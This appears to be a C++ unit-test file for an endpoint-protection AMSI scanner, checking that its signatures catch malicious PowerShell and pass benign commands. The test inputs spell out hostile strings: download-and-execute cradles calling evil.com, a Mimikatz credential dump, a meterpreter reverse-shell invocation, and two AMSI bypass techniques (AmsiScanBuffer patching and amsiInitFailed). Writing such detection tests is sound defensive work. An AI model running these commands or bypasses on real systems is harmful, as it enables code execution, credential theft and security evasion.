// test_amsi.cpp -- Tests for AMSI content scanning integration (P5-T9).
//
// Tests:
//   1. Init loads built-in patterns
//   2. Invoke-Mimikatz detected
//   3. Invoke-Expression + DownloadString chain detected
//   4. IEX + Net.WebClient cradle detected
//   5. Reflection.Assembly.Load detected
//   6. AmsiScanBuffer patching bypass detected
//   7. amsiInitFailed bypass detected
//   8. Clean PowerShell command not detected
//   9. Clean .NET code not detected
//  10. Case insensitive matching
//  11. Source derivation: PowerShell
//  12. Source derivation: DotNet
//  13. Source derivation: VBScript
//  14. Source derivation: JScript
//  15. Source derivation: unknown
//  16. Empty buffer returns clean
//  17. Invoke-Shellcode detected
//  18. Multiple patterns must all match (AND logic)
//  19. Custom pattern can be added
//  20. Benign script with partial keyword match not detected

#include <gtest/gtest.h>

#include "edr_amsi_av.h"

#include <cstring>
#include <string>

// ---- Helpers ------------------------------------------------------------

static AmsiScanResult scan_string(AmsiScanner& scanner,
                                   const std::string& content,
                                   const char* app_name = "PowerShell")
{
    return scanner.scan(
        reinterpret_cast<const uint8_t*>(content.c_str()),
        content.size(), app_name);
}

// ---- Test Fixture -------------------------------------------------------

class AmsiTest : public ::testing::Test {
protected:
    void SetUp() override {
        ASSERT_TRUE(scanner_.init(nullptr));
    }

    AmsiScanner scanner_;
};

// ---- Init ---------------------------------------------------------------

TEST_F(AmsiTest, InitLoadsBuiltinPatterns)
{
    EXPECT_GE(scanner_.pattern_count(), 10u);
}

// ---- Detection tests ----------------------------------------------------

TEST_F(AmsiTest, InvokeMimikatzDetected)
{
    auto r = scan_string(scanner_,
        "$cred = Invoke-Mimikatz -DumpCreds");
    EXPECT_TRUE(r.detected);
    EXPECT_EQ(r.result, AMSI_RESULT_DETECTED);
    EXPECT_EQ(r.malware_name, "AMSI.Trojan.InvokeMimikatz");
    EXPECT_EQ(r.signature_id, "amsi-001");
}

TEST_F(AmsiTest, InvokeExpressionDownloadStringDetected)
{
    auto r = scan_string(scanner_,
        "Invoke-Expression (New-Object Net.WebClient).DownloadString("
        "'http://evil.com/payload.ps1')");
    EXPECT_TRUE(r.detected);
    EXPECT_EQ(r.malware_name, "AMSI.Trojan.DownloadCradle");
    EXPECT_EQ(r.signature_id, "amsi-002");
}

TEST_F(AmsiTest, IEXWebClientCradleDetected)
{
    auto r = scan_string(scanner_,
        "IEX (New-Object Net.WebClient).DownloadFile("
        "'http://evil.com/p.exe','C:\\temp\\p.exe')");
    EXPECT_TRUE(r.detected);
    // Should match either amsi-002 or amsi-003 (IEX + Net.WebClient)
    EXPECT_TRUE(r.malware_name.find("DownloadCradle") != std::string::npos)
        << "Got: " << r.malware_name;
}

TEST_F(AmsiTest, ReflectionAssemblyLoadDetected)
{
    auto r = scan_string(scanner_,
        "[Reflection.Assembly]::Load([Convert]::FromBase64String($base64))");
    EXPECT_TRUE(r.detected);
    EXPECT_TRUE(r.malware_name.find("ReflectionLoad") != std::string::npos)
        << "Got: " << r.malware_name;
}

TEST_F(AmsiTest, SystemReflectionAssemblyLoadDetected)
{
    auto r = scan_string(scanner_,
        "$assembly = [System.Reflection.Assembly]::Load($bytes)");
    EXPECT_TRUE(r.detected);
    EXPECT_TRUE(r.malware_name.find("ReflectionLoad") != std::string::npos)
        << "Got: " << r.malware_name;
}

TEST_F(AmsiTest, AmsiScanBufferPatchDetected)
{
    auto r = scan_string(scanner_,
        "$addr = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer("
        "(GetProcAddress (GetModuleHandle 'amsi.dll') 'AmsiScanBuffer'),"
        "$type)\n"
        "[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)\n"
        "VirtualProtect $addr 5 0x40 [ref]$old");
    EXPECT_TRUE(r.detected);
    EXPECT_TRUE(r.malware_name.find("Bypass") != std::string::npos)
        << "Got: " << r.malware_name;
}

TEST_F(AmsiTest, AmsiInitFailedBypassDetected)
{
    auto r = scan_string(scanner_,
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
    EXPECT_TRUE(r.detected);
    EXPECT_EQ(r.malware_name, "AMSI.Bypass.InitFailed");
    EXPECT_EQ(r.signature_id, "amsi-008");
}

TEST_F(AmsiTest, InvokeShellcodeDetected)
{
    auto r = scan_string(scanner_,
        "Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp "
        "-Lhost 10.0.0.1 -Lport 4444");
    EXPECT_TRUE(r.detected);
    EXPECT_EQ(r.malware_name, "AMSI.Trojan.InvokeShellcode");
}

// ---- Clean tests (no false positives) -----------------------------------

TEST_F(AmsiTest, CleanPowerShellGetProcess)
{
    auto r = scan_string(scanner_, "Get-Process | Format-Table Name, CPU");
    EXPECT_FALSE(r.detected);
    EXPECT_EQ(r.result, AMSI_RESULT_NOT_DETECTED);
}

TEST_F(AmsiTest, CleanPowerShellDir)
{
    auto r = scan_string(scanner_, "Get-ChildItem -Path C:\\ -Recurse");
    EXPECT_FALSE(r.detected);
}

TEST_F(AmsiTest, CleanDotNetCode)
{
    auto r = scan_string(scanner_,
        "using System;\nclass Program { static void Main() { "
        "Console.WriteLine(\"Hello\"); } }",
        "DotNet");
    EXPECT_FALSE(r.detected);
}

TEST_F(AmsiTest, CleanPowerShellServiceQuery)
{
    auto r = scan_string(scanner_,
        "Get-Service | Where-Object {$_.Status -eq 'Running'}");
    EXPECT_FALSE(r.detected);
}

TEST_F(AmsiTest, CleanPowerShellModuleImport)
{
    auto r = scan_string(scanner_,
        "Import-Module ActiveDirectory\n"
        "Get-ADUser -Filter * | Select-Object Name, Enabled");
    EXPECT_FALSE(r.detected);
}

// ---- Case insensitive ---------------------------------------------------

TEST_F(AmsiTest, CaseInsensitiveMatching)
{
    // Lowercase invoke-mimikatz
    auto r = scan_string(scanner_, "invoke-mimikatz -dumpcreds");
    EXPECT_TRUE(r.detected);
    EXPECT_EQ(r.malware_name, "AMSI.Trojan.InvokeMimikatz");

    // Mixed case
    auto r2 = scan_string(scanner_, "INVOKE-MIMIKATZ -DumpCreds");
    EXPECT_TRUE(r2.detected);
}

// ---- Source derivation --------------------------------------------------

TEST_F(AmsiTest, SourceDerivationPowerShell)
{
    auto r = scan_string(scanner_, "test", "PowerShell_ISE.exe");
    EXPECT_EQ(r.source, "powershell");
}

TEST_F(AmsiTest, SourceDerivationDotNet)
{
    auto r = scan_string(scanner_, "test", "DotNet");
    EXPECT_EQ(r.source, "dotnet");

    auto r2 = scan_string(scanner_, "test", "Microsoft .NET Framework");
    EXPECT_EQ(r2.source, "dotnet");
}

TEST_F(AmsiTest, SourceDerivationVBScript)
{
    auto r = scan_string(scanner_, "test", "VBScript");
    EXPECT_EQ(r.source, "vbscript");

    auto r2 = scan_string(scanner_, "test", "WScript.exe");
    EXPECT_EQ(r2.source, "vbscript");
}

TEST_F(AmsiTest, SourceDerivationJScript)
{
    auto r = scan_string(scanner_, "test", "JScript");
    EXPECT_EQ(r.source, "jscript");

    auto r2 = scan_string(scanner_, "test", "CScript.exe");
    EXPECT_EQ(r2.source, "jscript");
}

TEST_F(AmsiTest, SourceDerivationUnknown)
{
    auto r = scan_string(scanner_, "test", "SomeOtherApp");
    EXPECT_EQ(r.source, "unknown");
}

// ---- Edge cases ---------------------------------------------------------

TEST_F(AmsiTest, EmptyBufferReturnsClean)
{
    auto r = scanner_.scan(nullptr, 0, "PowerShell");
    EXPECT_FALSE(r.detected);
    EXPECT_EQ(r.result, AMSI_RESULT_NOT_DETECTED);
}

TEST_F(AmsiTest, MultiplePatternsANDLogic)
{
    // "DownloadCradle" requires BOTH "Invoke-Expression" AND "DownloadString"
    // Only one keyword -> should NOT match that rule
    auto r = scan_string(scanner_, "Invoke-Expression $someVar");
    // This might match if there's a single-pattern rule, but DownloadCradle
    // needs both. Check it doesn't match as DownloadCradle specifically.
    if (r.detected) {
        EXPECT_NE(r.malware_name, "AMSI.Trojan.DownloadCradle")
            << "Should not match DownloadCradle with only one keyword";
    }
}

TEST_F(AmsiTest, CustomPatternCanBeAdded)
{
    AmsiPattern custom;
    custom.name = "Custom.Test.Rule";
    custom.signature_id = "custom-001";
    custom.patterns = {"CUSTOM_MALWARE_KEYWORD"};
    custom.case_insensitive = false;

    scanner_.add_pattern(custom);
    EXPECT_EQ(scanner_.pattern_count(), 13u); // 12 built-in + 1 custom

    auto r = scan_string(scanner_, "This has CUSTOM_MALWARE_KEYWORD in it");
    EXPECT_TRUE(r.detected);
    EXPECT_EQ(r.malware_name, "Custom.Test.Rule");
}

TEST_F(AmsiTest, PartialKeywordNoFalsePositive)
{
    // "amsiInitFailed" is a keyword, but "amsiInit" alone should not trigger
    // (though it might if a single-pattern rule matches... let's check)
    auto r = scan_string(scanner_, "Checking amsiInit status...");
    // Should not match amsi-008 which requires "amsiInitFailed"
    if (r.detected) {
        EXPECT_NE(r.signature_id, "amsi-008")
            << "Partial match 'amsiInit' should not trigger amsiInitFailed rule";
    }
}
